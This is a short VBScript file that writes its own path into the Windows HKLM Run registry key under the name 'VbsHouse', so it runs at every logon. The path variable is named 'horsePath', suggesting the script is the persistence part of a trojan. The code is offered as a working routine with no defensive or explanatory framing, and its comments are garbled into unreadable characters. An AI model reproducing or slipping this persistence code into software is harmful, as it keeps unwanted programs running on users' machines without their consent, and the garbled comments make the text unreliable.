Call ConfigureAutoRun()

WScript.Echo("Auto Run")

Sub ConfigureAutoRun()
	Dim objFileSystem
	Set objFileSystem = WScript.CreateObject("scripting.filesystemobject")
	Const REG_PATH = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\"	'����������ע����ַ
	Const KEY_NAME = "VbsHouse"												'��Ҫ���������ĳ����ע�������
	horsePath = objFileSystem.GetFile(Wscript.ScriptFullName)				'��Ҫ���������ĳ���ľ���·��
	Call WriteReg(REG_PATH & KEY_NAME, horsePath, "") '�޸�ע���������
	Set objFileSystem = Nothing
End Sub

Sub WriteReg(key, value, typeName) 'дע���
	Dim objShell
	Set objShell = CreateObject("WScript.Shell")
	If typeName = "" Then
		objShell.RegWrite key, value
	Else
		objShell.RegWrite key, value, typeName
	End If
	Set objShell = Nothing
End Sub